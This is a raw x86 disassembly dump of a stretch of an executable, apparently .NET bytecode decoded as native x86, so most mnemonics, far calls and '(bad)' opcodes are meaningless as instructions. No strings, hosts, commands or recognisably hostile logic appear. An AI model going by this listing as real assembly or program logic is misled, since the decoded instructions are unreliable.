  404e96:	13 1a                	adc    (%edx),%ebx
  404e98:	16                   	push   %ss
  404e99:	13 1f                	adc    (%edi),%ebx
  404e9b:	18 13                	sbb    %dl,(%ebx)
  404e9d:	08 11                	or     %dl,(%ecx)
  404e9f:	1f                   	pop    %ds
  404ea0:	11 08                	adc    %ecx,(%eax)
  404ea2:	58                   	pop    %eax
  404ea3:	18 5b 13             	sbb    %bl,0x13(%ebx)
  404ea6:	20 08                	and    %cl,(%eax)
  404ea8:	1f                   	pop    %ds
  404ea9:	70 58                	jo     0x404f03
  404eab:	11 20                	adc    %esp,(%eax)
  404ead:	1f                   	pop    %ds
  404eae:	28 5a 58             	sub    %bl,0x58(%edx)
  404eb1:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404eb4:	4a                   	dec    %edx
  404eb5:	13 21                	adc    (%ecx),%esp
  404eb7:	08 1f                	or     %bl,(%edi)
  404eb9:	70 58                	jo     0x404f13
  404ebb:	11 20                	adc    %esp,(%eax)
  404ebd:	1f                   	pop    %ds
  404ebe:	28 5a 58             	sub    %bl,0x58(%edx)
  404ec1:	1e                   	push   %ds
  404ec2:	58                   	pop    %eax
  404ec3:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404ec6:	4a                   	dec    %edx
  404ec7:	13 22                	adc    (%edx),%esp
  404ec9:	11 1a                	adc    %ebx,(%edx)
  404ecb:	11 21                	adc    %esp,(%ecx)
  404ecd:	11 22                	adc    %esp,(%edx)
  404ecf:	58                   	pop    %eax
  404ed0:	2f                   	das
  404ed1:	0a 11                	or     (%ecx),%dl
  404ed3:	21 11                	and    %edx,(%ecx)
  404ed5:	1a 30                	sbb    (%eax),%dh
  404ed7:	0c 11                	or     $0x11,%al
  404ed9:	20 2b                	and    %ch,(%ebx)
  404edb:	10 11                	adc    %dl,(%ecx)
  404edd:	20 17                	and    %dl,(%edi)
  404edf:	58                   	pop    %eax
  404ee0:	13 1f                	adc    (%edi),%ebx
  404ee2:	2b ba 11 20 17 59    	sub    0x59172011(%edx),%edi
  404ee8:	13 08                	adc    (%eax),%ecx
  404eea:	2b b2 00 13 18 08    	sub    0x8181300(%edx),%esi
  404ef0:	1f                   	pop    %ds
  404ef1:	70 58                	jo     0x404f4b
  404ef3:	11 18                	adc    %ebx,(%eax)
  404ef5:	1f                   	pop    %ds
  404ef6:	28 5a 58             	sub    %bl,0x58(%edx)
  404ef9:	1f                   	pop    %ds
  404efa:	10 58 11             	adc    %bl,0x11(%eax)
  404efd:	04 58                	add    $0x58,%al
  404eff:	4a                   	dec    %edx
  404f00:	13 17                	adc    (%edi),%edx
  404f02:	11 17                	adc    %edx,(%edi)
  404f04:	13 16                	adc    (%esi),%edx
  404f06:	11 16                	adc    %edx,(%esi)
  404f08:	13 19                	adc    (%ecx),%ebx
  404f0a:	00 11                	add    %dl,(%ecx)
  404f0c:	12 14 33             	adc    (%ebx,%esi,1),%dl
  404f0f:	05 38 8f 01 00       	add    $0x18f38,%eax
  404f14:	00 00                	add    %al,(%eax)
  404f16:	11 12                	adc    %edx,(%edx)
  404f18:	16                   	push   %ss
  404f19:	9a a5 04 00 00 01 16 	lcall  $0x1601,$0x4a5
  404f20:	40                   	inc    %eax
  404f21:	b0 00                	mov    $0x0,%al
  404f23:	00 00                	add    %al,(%eax)
  404f25:	11 12                	adc    %edx,(%edx)
  404f27:	18 9a a5 04 00 00    	sbb    %bl,0x4a5(%edx)
  404f2d:	01 11                	add    %edx,(%ecx)
  404f2f:	16                   	push   %ss
  404f30:	15 33 06 15 38       	adc    $0x38150633,%eax
  404f35:	83 00 00             	addl   $0x0,(%eax)
  404f38:	00 00                	add    %al,(%eax)
  404f3a:	08 11                	or     %dl,(%ecx)
  404f3c:	16                   	push   %ss
  404f3d:	58                   	pop    %eax
  404f3e:	1f                   	pop    %ds
  404f3f:	28 58 11             	sub    %bl,0x11(%eax)
  404f42:	04 58                	add    $0x58,%al
  404f44:	4a                   	dec    %edx
  404f45:	13 23                	adc    (%ebx),%esp
  404f47:	16                   	push   %ss
  404f48:	13 22                	adc    (%edx),%esp
  404f4a:	18 13                	sbb    %dl,(%ebx)
  404f4c:	21 11                	and    %edx,(%ecx)
  404f4e:	22 11                	and    (%ecx),%dl
  404f50:	21 58 18             	and    %ebx,0x18(%eax)
  404f53:	5b                   	pop    %ebx
  404f54:	13 20                	adc    (%eax),%esp
  404f56:	08 20                	or     %ah,(%eax)
  404f58:	e8 00 00 00 58       	call   0x58404f5d
  404f5d:	11 20                	adc    %esp,(%eax)
  404f5f:	1f                   	pop    %ds
  404f60:	50                   	push   %eax
  404f61:	5a                   	pop    %edx
  404f62:	58                   	pop    %eax
  404f63:	1e                   	push   %ds
  404f64:	58                   	pop    %eax
  404f65:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404f68:	4a                   	dec    %edx
  404f69:	13 08                	adc    (%eax),%ecx
  404f6b:	08 20                	or     %ah,(%eax)
  404f6d:	e8 00 00 00 58       	call   0x58404f72
  404f72:	11 20                	adc    %esp,(%eax)
  404f74:	1f                   	pop    %ds
  404f75:	50                   	push   %eax
  404f76:	5a                   	pop    %edx
  404f77:	58                   	pop    %eax
  404f78:	1f                   	pop    %ds
  404f79:	10 58 11             	adc    %bl,0x11(%eax)
  404f7c:	04 58                	add    $0x58,%al
  404f7e:	4a                   	dec    %edx
  404f7f:	13 1f                	adc    (%edi),%ebx
  404f81:	11 23                	adc    %esp,(%ebx)
  404f83:	11 08                	adc    %ecx,(%eax)
  404f85:	11 1f                	adc    %ebx,(%edi)
  404f87:	58                   	pop    %eax
  404f88:	2f                   	das
  404f89:	0a 11                	or     (%ecx),%dl
  404f8b:	08 11                	or     %dl,(%ecx)
  404f8d:	23 30                	and    (%eax),%esi
  404f8f:	0c 11                	or     $0x11,%al
  404f91:	20 2b                	and    %ch,(%ebx)
  404f93:	10 11                	adc    %dl,(%ecx)
  404f95:	20 17                	and    %dl,(%edi)
  404f97:	58                   	pop    %eax
  404f98:	13 22                	adc    (%edx),%esp
  404f9a:	2b b1 11 20 17 59    	sub    0x59172011(%ecx),%esi
  404fa0:	13 21                	adc    (%ecx),%esp
  404fa2:	2b a9 00 13 17 08    	sub    0x8171300(%ecx),%ebp
  404fa8:	20 e8                	and    %ch,%al
  404faa:	00 00                	add    %al,(%eax)
  404fac:	00 58 11             	add    %bl,0x11(%eax)
  404faf:	17                   	pop    %ss
  404fb0:	1f                   	pop    %ds
  404fb1:	50                   	push   %eax
  404fb2:	5a                   	pop    %edx
  404fb3:	58                   	pop    %eax
  404fb4:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404fb7:	4a                   	dec    %edx
  404fb8:	13 18                	adc    (%eax),%ebx
  404fba:	11 18                	adc    %ebx,(%eax)
  404fbc:	00 33                	add    %dh,(%ebx)
  404fbe:	05 38 e0 00 00       	add    $0xe038,%eax
  404fc3:	00 00                	add    %al,(%eax)
  404fc5:	11 12                	adc    %edx,(%edx)
  404fc7:	17                   	pop    %ss
  404fc8:	9a 74 01 00 00 1b 13 	lcall  $0x131b,$0x174
  404fcf:	12 38                	adc    (%eax),%bh
  404fd1:	35 ff ff ff 00       	xor    $0xffffff,%eax
  404fd6:	11 12                	adc    %edx,(%edx)
  404fd8:	1d 9a a5 04 00       	sbb    $0x4a59a,%eax
  404fdd:	00 01                	add    %al,(%ecx)
  404fdf:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  404fe2:	1c 18                	sbb    $0x18,%al
  404fe4:	2e 10 11             	adc    %dl,%cs:(%ecx)
  404fe7:	1c 16                	sbb    $0x16,%al
  404fe9:	2e 0b 11             	or     %cs:(%ecx),%edx
  404fec:	1c 17                	sbb    $0x17,%al
  404fee:	33 05 38 28 fc ff    	xor    0xfffc2838,%eax
  404ff4:	ff 00                	incl   (%eax)
  404ff6:	00 11                	add    %dl,(%ecx)
  404ff8:	12 18                	adc    (%eax),%bl
  404ffa:	9a a5 04 00 00 01 11 	lcall  $0x1101,$0x4a5
  405001:	16                   	push   %ss
  405002:	15 33 06 15 38       	adc    $0x38150633,%eax
  405007:	83 00 00             	addl   $0x0,(%eax)
  40500a:	00 00                	add    %al,(%eax)
  40500c:	08 11                	or     %dl,(%ecx)
  40500e:	16                   	push   %ss
  40500f:	58                   	pop    %eax
  405010:	1f                   	pop    %ds
  405011:	28 58 11             	sub    %bl,0x11(%eax)
  405014:	04 58                	add    $0x58,%al
  405016:	4a                   	dec    %edx
  405017:	13 1a                	adc    (%edx),%ebx
  405019:	16                   	push   %ss
  40501a:	13 1f                	adc    (%edi),%ebx
  40501c:	18 13                	sbb    %dl,(%ebx)
  40501e:	08 11                	or     %dl,(%ecx)
  405020:	1f                   	pop    %ds
  405021:	11 08                	adc    %ecx,(%eax)
  405023:	58                   	pop    %eax
  405024:	18 5b 13             	sbb    %bl,0x13(%ebx)
  405027:	20 08                	and    %cl,(%eax)
  405029:	20 e8                	and    %ch,%al
  40502b:	00 00                	add    %al,(%eax)
  40502d:	00 58 11             	add    %bl,0x11(%eax)
  405030:	20 1f                	and    %bl,(%edi)
  405032:	50                   	push   %eax
  405033:	5a                   	pop    %edx
  405034:	58                   	pop    %eax
  405035:	1e                   	push   %ds
  405036:	58                   	pop    %eax
  405037:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  40503a:	4a                   	dec    %edx
  40503b:	13 21                	adc    (%ecx),%esp
  40503d:	08 20                	or     %ah,(%eax)
  40503f:	e8 00 00 00 58       	call   0x58405044
  405044:	11 20                	adc    %esp,(%eax)
  405046:	1f                   	pop    %ds
  405047:	50                   	push   %eax
  405048:	5a                   	pop    %edx
  405049:	58                   	pop    %eax
  40504a:	1f                   	pop    %ds
  40504b:	10 58 11             	adc    %bl,0x11(%eax)
  40504e:	04 58                	add    $0x58,%al
  405050:	4a                   	dec    %edx
  405051:	13 22                	adc    (%edx),%esp
  405053:	11 1a                	adc    %ebx,(%edx)
  405055:	11 21                	adc    %esp,(%ecx)
  405057:	11 22                	adc    %esp,(%edx)
  405059:	58                   	pop    %eax
  40505a:	2f                   	das
  40505b:	0a 11                	or     (%ecx),%dl
  40505d:	21 11                	and    %edx,(%ecx)
  40505f:	1a 30                	sbb    (%eax),%dh
  405061:	0c 11                	or     $0x11,%al
  405063:	20 2b                	and    %ch,(%ebx)
  405065:	10 11                	adc    %dl,(%ecx)
  405067:	20 17                	and    %dl,(%edi)
  405069:	58                   	pop    %eax
  40506a:	13 1f                	adc    (%edi),%ebx
  40506c:	2b b1 11 20 17 59    	sub    0x59172011(%ecx),%esi
  405072:	13 08                	adc    (%eax),%ecx
  405074:	2b a9 00 13 18 08    	sub    0x8181300(%ecx),%ebp
  40507a:	20 e8                	and    %ch,%al
  40507c:	00 00                	add    %al,(%eax)
  40507e:	00 58 11             	add    %bl,0x11(%eax)
  405081:	18 1f                	sbb    %bl,(%edi)
  405083:	50                   	push   %eax
  405084:	5a                   	pop    %edx
  405085:	58                   	pop    %eax
  405086:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  405089:	4a                   	dec    %edx
  40508a:	13 17                	adc    (%edi),%edx
  40508c:	11 17                	adc    %edx,(%edi)
  40508e:	00 33                	add    %dh,(%ebx)
  405090:	02 2b                	add    (%ebx),%ch
  405092:	11 00                	adc    %eax,(%eax)
  405094:	11 12                	adc    %edx,(%edx)
  405096:	17                   	pop    %ss
  405097:	9a 74 01 00 00 1b 13 	lcall  $0x131b,$0x174
  40509e:	12 38                	adc    (%eax),%bh
  4050a0:	66 fe                	data16 (bad)
  4050a2:	ff                   	(bad)
  4050a3:	ff 00                	incl   (%eax)
  4050a5:	15 11 16 33 06       	adc    $0x6331611,%eax
  4050aa:	17                   	pop    %ss
  4050ab:	13 24 11             	adc    (%ecx,%edx,1),%esp
  4050ae:	1d 7a 00 08 11       	sbb    $0x1108007a,%eax
  4050b3:	16                   	push   %ss
  4050b4:	58                   	pop    %eax
  4050b5:	1e                   	push   %ds
  4050b6:	58                   	pop    %eax
  4050b7:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4050ba:	4a                   	dec    %edx
  4050bb:	13 15 11 15 13 08    	adc    0x8131511,%edx
  4050c1:	00 11                	add    %dl,(%ecx)
  4050c3:	08 15 33 0f 08 11    	or     %dl,0x11080f33
  4050c9:	16                   	push   %ss
  4050ca:	58                   	pop    %eax
  4050cb:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4050ce:	4a                   	dec    %edx
  4050cf:	13 16                	adc    (%esi),%edx
  4050d1:	38 34 fe             	cmp    %dh,(%esi,%edi,8)
  4050d4:	ff                   	(bad)
  4050d5:	ff 00                	incl   (%eax)
  4050d7:	08 11                	or     %dl,(%ecx)
  4050d9:	08 58 1e             	or     %bl,0x1e(%eax)
  4050dc:	58                   	pop    %eax
  4050dd:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4050e0:	4a                   	dec    %edx
  4050e1:	13 21                	adc    (%ecx),%esp
  4050e3:	16                   	push   %ss
  4050e4:	11 21                	adc    %esp,(%ecx)
  4050e6:	2e 17                	cs pop %ss
  4050e8:	17                   	pop    %ss
  4050e9:	11 21                	adc    %esp,(%ecx)
  4050eb:	3b 7c 01 00          	cmp    0x0(%ecx,%eax,1),%edi
  4050ef:	00 08                	add    %cl,(%eax)
  4050f1:	11 16                	adc    %edx,(%esi)
  4050f3:	58                   	pop    %eax
  4050f4:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4050f7:	4a                   	dec    %edx
  4050f8:	13 16                	adc    (%esi),%edx
  4050fa:	38 0b                	cmp    %cl,(%ebx)
  4050fc:	fe                   	(bad)
  4050fd:	ff                   	(bad)
  4050fe:	ff 00                	incl   (%eax)
  405100:	08 11                	or     %dl,(%ecx)
  405102:	08 58 1f             	or     %bl,0x1f(%eax)
  405105:	10 58 11             	adc    %bl,0x11(%eax)
  405108:	04 58                	add    $0x58,%al
  40510a:	4a                   	dec    %edx
  40510b:	13 20                	adc    (%eax),%esp
  40510d:	11 20                	adc    %esp,(%eax)
  40510f:	15 2e 3a 07 11       	adc    $0x11073a2e,%eax
  405114:	20 9a 25 14 33 16    	and    %bl,0x16331425(%edx)
  40511a:	26 07                	es pop %es
  40511c:	11 20                	adc    %esp,(%eax)
  40511e:	06                   	push   %es
  40511f:	11 20                	adc    %esp,(%eax)
  405121:	a3 11 00 00 01       	mov    %eax,0x1000011
  405126:	28 0d 00 00 0a a2    	sub    %cl,0xa20a0000
  40512c:	07                   	pop    %es
  40512d:	11 20                	adc    %esp,(%eax)
  40512f:	9a 00 11 1d 28 0e 00 	lcall  $0xe,$0x281d1100
  405136:	00 0a                	add    %cl,(%edx)
  405138:	2d 12 08 11 08       	sub    $0x8110812,%eax
  40513d:	58                   	pop    %eax
  40513e:	1f                   	pop    %ds
  40513f:	28 58 11             	sub    %bl,0x11(%eax)
  405142:	04 58                	add    $0x58,%al
  405144:	4a                   	dec    %edx
  405145:	13 08                	adc    (%eax),%ecx
  405147:	38 75 ff             	cmp    %dh,-0x1(%ebp)
  40514a:	ff                   	(bad)
  40514b:	ff 00                	incl   (%eax)
  40514d:	11 08                	adc    %ecx,(%eax)
  40514f:	13 17                	adc    (%edi),%edx
  405151:	08 08                	or     %cl,(%eax)
  405153:	11 17                	adc    %edx,(%edi)
  405155:	58                   	pop    %eax
  405156:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  405159:	4a                   	dec    %edx
  40515a:	58                   	pop    %eax
  40515b:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  40515e:	4a                   	dec    %edx
  40515f:	13 18                	adc    (%eax),%ebx
  405161:	11 19                	adc    %ebx,(%ecx)
  405163:	11 1e                	adc    %ebx,(%esi)
  405165:	59                   	pop    %ecx
  405166:	11 1e                	adc    %ebx,(%esi)
  405168:	15 fe 01 5a 11       	adc    $0x115a01fe,%eax
  40516d:	1e                   	push   %ds
  40516e:	58                   	pop    %eax
  40516f:	13 23                	adc    (%ebx),%esp
  405171:	00 11                	add    %dl,(%ecx)
  405173:	23 11                	and    (%ecx),%edx
  405175:	18 33                	sbb    %dh,(%ebx)
  405177:	65 08 11             	or     %dl,%gs:(%ecx)
  40517a:	17                   	pop    %ss
  40517b:	58                   	pop    %eax
  40517c:	1f                   	pop    %ds
  40517d:	38 58 11             	cmp    %bl,0x11(%eax)
  405180:	04 58                	add    $0x58,%al
  405182:	4a                   	dec    %edx
  405183:	13 1f                	adc    (%edi),%ebx
  405185:	11 1d 13 0a 1e 8d    	adc    %ebx,0x8d1e0a13
  40518b:	03 00                	add    (%eax),%eax
  40518d:	00 01                	add    %al,(%ecx)
  40518f:	13 13                	adc    (%ebx),%edx
  405191:	11 13                	adc    %edx,(%ebx)
  405193:	16                   	push   %ss
  405194:	17                   	pop    %ss
  405195:	8c 04 00             	mov    %es,(%eax,%eax,1)
  405198:	00 01                	add    %al,(%ecx)
  40519a:	a2 11 13 17 11       	mov    %al,0x11171311
  40519f:	12 a2 11 13 1a 11    	adc    0x111a1311(%edx),%ah
  4051a5:	1d a2 11 13 1b       	sbb    $0x1b1311a2,%eax
  4051aa:	11 19                	adc    %ebx,(%ecx)
  4051ac:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4051af:	00 01                	add    %al,(%ecx)
  4051b1:	a2 11 13 18 11       	mov    %al,0x11181311
  4051b6:	17                   	pop    %ss
  4051b7:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4051ba:	00 01                	add    %al,(%ecx)
  4051bc:	a2 11 13 1d 18       	mov    %al,0x181d1311
  4051c1:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4051c4:	00 01                	add    %al,(%ecx)
  4051c6:	a2 11 13 13 12       	mov    %al,0x12131311
  4051cb:	08 11                	or     %dl,(%ecx)
  4051cd:	17                   	pop    %ss
  4051ce:	58                   	pop    %eax
  4051cf:	1f                   	pop    %ds
  4051d0:	38 58 11             	cmp    %bl,0x11(%eax)
  4051d3:	04 58                	add    $0x58,%al
  4051d5:	4a                   	dec    %edx
  4051d6:	13 05 38 f6 f9 ff    	adc    0xfff9f638,%eax
  4051dc:	ff 00                	incl   (%eax)
  4051de:	08 11                	or     %dl,(%ecx)
  4051e0:	23 58 1f             	and    0x1f(%eax),%ebx
  4051e3:	10 58 11             	adc    %bl,0x11(%eax)
  4051e6:	04 58                	add    $0x58,%al
  4051e8:	4a                   	dec    %edx
  4051e9:	13 22                	adc    (%edx),%esp
  4051eb:	11 22                	adc    %esp,(%edx)
  4051ed:	15 2e 6c 08 11       	adc    $0x11086c2e,%eax
  4051f2:	22 58 1f             	and    0x1f(%eax),%bl
  4051f5:	38 58 11             	cmp    %bl,0x11(%eax)
  4051f8:	04 58                	add    $0x58,%al
  4051fa:	4a                   	dec    %edx
  4051fb:	13 1f                	adc    (%edi),%ebx
  4051fd:	1e                   	push   %ds
  4051fe:	8d 03                	lea    (%ebx),%eax
  405200:	00 00                	add    %al,(%eax)
  405202:	01 13                	add    %edx,(%ebx)
  405204:	13 11                	adc    (%ecx),%edx
  405206:	13 16                	adc    (%esi),%edx
  405208:	17                   	pop    %ss
  405209:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40520c:	00 01                	add    %al,(%ecx)
  40520e:	a2 11 13 17 11       	mov    %al,0x11171311
  405213:	12 a2 11 13 1a 11    	adc    0x111a1311(%edx),%ah
  405219:	1d a2 11 13 1b       	sbb    $0x1b1311a2,%eax
  40521e:	11 19                	adc    %ebx,(%ecx)
  405220:	8c 04 00             	mov    %es,(%eax,%eax,1)
  405223:	00 01                	add    %al,(%ecx)
  405225:	a2 11 13 18 11       	mov    %al,0x11181311
  40522a:	22 8c 04 00 00 01 a2 	and    -0x5dff0000(%esp,%eax,1),%cl
  405231:	11 13                	adc    %edx,(%ebx)
  405233:	1c 11                	sbb    $0x11,%al
  405235:	17                   	pop    %ss
  405236:	8c 04 00             	mov    %es,(%eax,%eax,1)
  405239:	00 01                	add    %al,(%ecx)
  40523b:	a2 11 13 1d 16       	mov    %al,0x161d1311
  405240:	8c 04 00             	mov    %es,(%eax,%eax,1)
  405243:	00 01                	add    %al,(%ecx)
  405245:	a2 11 13 13 12       	mov    %al,0x12131311
  40524a:	08 11                	or     %dl,(%ecx)
  40524c:	22 58 1f             	and    0x1f(%eax),%bl
  40524f:	38 58 11             	cmp    %bl,0x11(%eax)
  405252:	04 58                	add    $0x58,%al
  405254:	4a                   	dec    %edx
  405255:	13 05 38 77 f9 ff    	adc    0xfff97738,%eax
  40525b:	ff 00                	incl   (%eax)
  40525d:	08 11                	or     %dl,(%ecx)
  40525f:	23 58 11             	and    0x11(%eax),%ebx
  405262:	04 58                	add    $0x58,%al
  405264:	4a                   	dec    %edx
  405265:	13 23                	adc    (%ebx),%esp
  405267:	38 05 ff ff ff 00    	cmp    %al,0xffffff
  40526d:	08 11                	or     %dl,(%ecx)
  40526f:	08 58 1f             	or     %bl,0x1f(%eax)
  405272:	20 58 11             	and    %bl,0x11(%eax)
  405275:	04 58                	add    $0x58,%al
  405277:	4a                   	dec    %edx
  405278:	13 1f                	adc    (%edi),%ebx
  40527a:	11 1d 13 0a 1e 8d    	adc    %ebx,0x8d1e0a13
  405280:	03 00                	add    (%eax),%eax
  405282:	00 01                	add    %al,(%ecx)
  405284:	13 13                	adc    (%ebx),%edx
  405286:	11 13                	adc    %edx,(%ebx)
  405288:	16                   	push   %ss
  405289:	17                   	pop    %ss
  40528a:	8c 04 00             	mov    %es,(%eax,%eax,1)
  40528d:	00 01                	add    %al,(%ecx)
  40528f:	a2 11 13 17 11       	mov    %al,0x11171311
  405294:	12 a2 11 13 1a 11    	adc    0x111a1311(%edx),%ah
  40529a:	1d a2 11 13 1b       	sbb    $0x1b1311a2,%eax
  40529f:	11 19                	adc    %ebx,(%ecx)
  4052a1:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4052a4:	00 01                	add    %al,(%ecx)
  4052a6:	a2 11 13 18 11       	mov    %al,0x11181311
  4052ab:	08 8c 04 00 00 01 a2 	or     %cl,-0x5dff0000(%esp,%eax,1)
  4052b2:	11 13                	adc    %edx,(%ebx)
  4052b4:	1d 17 8c 04 00       	sbb    $0x48c17,%eax
  4052b9:	00 01                	add    %al,(%ecx)
  4052bb:	a2 11 13 13 12       	mov    %al,0x12131311
  4052c0:	08 11                	or     %dl,(%ecx)
  4052c2:	08 58 1f             	or     %bl,0x1f(%eax)
  4052c5:	20 58 11             	and    %bl,0x11(%eax)
  4052c8:	04 58                	add    $0x58,%al
  4052ca:	4a                   	dec    %edx
  4052cb:	13 05 38 01 f9 ff    	adc    0xfff90138,%eax
  4052d1:	ff 00                	incl   (%eax)
  4052d3:	11 05 13 19 11 19    	adc    %eax,0x19111913
  4052d9:	13 14 16             	adc    (%esi,%edx,1),%edx
  4052dc:	13 08                	adc    (%eax),%ecx
  4052de:	18 13                	sbb    %dl,(%ebx)
  4052e0:	20 11                	and    %dl,(%ecx)
  4052e2:	08 11                	or     %dl,(%ecx)
  4052e4:	20 58 18             	and    %bl,0x18(%eax)
  4052e7:	5b                   	pop    %ebx
  4052e8:	13 21                	adc    (%ecx),%esp
  4052ea:	08 1f                	or     %bl,(%edi)
  4052ec:	70 58                	jo     0x405346
  4052ee:	11 21                	adc    %esp,(%ecx)
  4052f0:	1f                   	pop    %ds
  4052f1:	28 5a 58             	sub    %bl,0x58(%edx)
  4052f4:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4052f7:	4a                   	dec    %edx
  4052f8:	13 22                	adc    (%edx),%esp
  4052fa:	08 1f                	or     %bl,(%edi)
  4052fc:	70 58                	jo     0x405356
  4052fe:	11 21                	adc    %esp,(%ecx)
  405300:	1f                   	pop    %ds
  405301:	28 5a 58             	sub    %bl,0x58(%edx)
  405304:	1e                   	push   %ds
  405305:	58                   	pop    %eax
  405306:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  405309:	4a                   	dec    %edx
  40530a:	13 23                	adc    (%ebx),%esp
  40530c:	11 14 11             	adc    %edx,(%ecx,%edx,1)
  40530f:	22 11                	and    (%ecx),%dl
  405311:	23 58 2f             	and    0x2f(%eax),%ebx
  405314:	0a 11                	or     (%ecx),%dl
  405316:	22 11                	and    (%ecx),%dl
  405318:	14 30                	adc    $0x30,%al
  40531a:	0c 11                	or     $0x11,%al
  40531c:	21 2b                	and    %ebp,(%ebx)
  40531e:	10 11                	adc    %dl,(%ecx)
  405320:	21 17                	and    %edx,(%edi)
  405322:	58                   	pop    %eax
  405323:	13 08                	adc    (%eax),%ecx
  405325:	2b ba 11 21 17 59    	sub    0x59172111(%edx),%edi
  40532b:	13 20                	adc    (%eax),%esp
  40532d:	2b b2 00 13 15 08    	sub    0x8151300(%edx),%esi
  405333:	1f                   	pop    %ds
  405334:	70 58                	jo     0x40538e
  405336:	11 15 1f 28 5a 58    	adc    %edx,0x585a281f
  40533c:	1f                   	pop    %ds
  40533d:	10 58 11             	adc    %bl,0x11(%eax)
  405340:	04 58                	add    $0x58,%al
  405342:	4a                   	dec    %edx
  405343:	13 16                	adc    (%esi),%edx
  405345:	11 16                	adc    %edx,(%esi)
  405347:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  40534a:	09 13                	or     %edx,(%ebx)
  40534c:	23 16                	and    (%esi),%edx
  40534e:	13 22                	adc    (%edx),%esp
  405350:	18 13                	sbb    %dl,(%ebx)
  405352:	21 11                	and    %edx,(%ecx)
  405354:	22 11                	and    (%ecx),%dl
  405356:	21 58 18             	and    %ebx,0x18(%eax)
  405359:	5b                   	pop    %ebx
  40535a:	13 20                	adc    (%eax),%esp
  40535c:	08 1f                	or     %bl,(%edi)
  40535e:	70 58                	jo     0x4053b8
  405360:	11 20                	adc    %esp,(%eax)
  405362:	1f                   	pop    %ds
  405363:	28 5a 58             	sub    %bl,0x58(%edx)
  405366:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  405369:	4a                   	dec    %edx
  40536a:	13 08                	adc    (%eax),%ecx
  40536c:	08 1f                	or     %bl,(%edi)
  40536e:	70 58                	jo     0x4053c8
  405370:	11 20                	adc    %esp,(%eax)
  405372:	1f                   	pop    %ds
  405373:	28 5a 58             	sub    %bl,0x58(%edx)
  405376:	1e                   	push   %ds
  405377:	58                   	pop    %eax
  405378:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  40537b:	4a                   	dec    %edx
  40537c:	13 14 11             	adc    (%ecx,%edx,1),%edx
  40537f:	23 11                	and    (%ecx),%edx
  405381:	08 11                	or     %dl,(%ecx)
  405383:	14 58                	adc    $0x58,%al
  405385:	2f                   	das
  405386:	0a 11                	or     (%ecx),%dl
  405388:	08 11                	or     %dl,(%ecx)
  40538a:	23 30                	and    (%eax),%esi
  40538c:	0c 11                	or     $0x11,%al
  40538e:	20 2b                	and    %ch,(%ebx)
  405390:	10 11                	adc    %dl,(%ecx)
  405392:	20 17                	and    %dl,(%edi)
  405394:	58                   	pop    %eax
  405395:	13 22                	adc    (%edx),%esp
  405397:	2b ba 11 20 17 59    	sub    0x59172011(%edx),%edi
  40539d:	13 21                	adc    (%ecx),%esp
  40539f:	2b b2 00 13 15 08    	sub    0x8151300(%edx),%esi
  4053a5:	1f                   	pop    %ds
  4053a6:	70 58                	jo     0x405400
  4053a8:	11 15 1f 28 5a 58    	adc    %edx,0x585a281f
  4053ae:	1f                   	pop    %ds
  4053af:	10 58 11             	adc    %bl,0x11(%eax)
  4053b2:	04 58                	add    $0x58,%al
  4053b4:	4a                   	dec    %edx
  4053b5:	13 18                	adc    (%eax),%ebx
  4053b7:	11 18                	adc    %ebx,(%eax)
  4053b9:	13 16                	adc    (%esi),%edx
  4053bb:	11 09                	adc    %ecx,(%ecx)
  4053bd:	13 14 16             	adc    (%esi,%edx,1),%edx
  4053c0:	13 08                	adc    (%eax),%ecx
  4053c2:	18 13                	sbb    %dl,(%ebx)
  4053c4:	20 11                	and    %dl,(%ecx)
  4053c6:	08 11                	or     %dl,(%ecx)
  4053c8:	20 58 18             	and    %bl,0x18(%eax)
  4053cb:	5b                   	pop    %ebx
  4053cc:	13 21                	adc    (%ecx),%esp
  4053ce:	08 20                	or     %ah,(%eax)
  4053d0:	e8 00 00 00 58       	call   0x584053d5
  4053d5:	11 21                	adc    %esp,(%ecx)
  4053d7:	1f                   	pop    %ds
  4053d8:	50                   	push   %eax
  4053d9:	5a                   	pop    %edx
  4053da:	58                   	pop    %eax
  4053db:	1e                   	push   %ds
  4053dc:	58                   	pop    %eax
  4053dd:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4053e0:	4a                   	dec    %edx
  4053e1:	13 22                	adc    (%edx),%esp
  4053e3:	08 20                	or     %ah,(%eax)
  4053e5:	e8 00 00 00 58       	call   0x584053ea
  4053ea:	11 21                	adc    %esp,(%ecx)
  4053ec:	1f                   	pop    %ds
  4053ed:	50                   	push   %eax
  4053ee:	5a                   	pop    %edx
  4053ef:	58                   	pop    %eax
  4053f0:	1f                   	pop    %ds
  4053f1:	10 58 11             	adc    %bl,0x11(%eax)
  4053f4:	04 58                	add    $0x58,%al
  4053f6:	4a                   	dec    %edx
  4053f7:	13 23                	adc    (%ebx),%esp
  4053f9:	11 14 11             	adc    %edx,(%ecx,%edx,1)
  4053fc:	22 11                	and    (%ecx),%dl
  4053fe:	23 58 2f             	and    0x2f(%eax),%ebx
  405401:	0a 11                	or     (%ecx),%dl
  405403:	22 11                	and    (%ecx),%dl
  405405:	14 30                	adc    $0x30,%al
  405407:	0c 11                	or     $0x11,%al
  405409:	21 2b                	and    %ebp,(%ebx)
  40540b:	10 11                	adc    %dl,(%ecx)
  40540d:	21 17                	and    %edx,(%edi)
  40540f:	58                   	pop    %eax
  405410:	13 08                	adc    (%eax),%ecx
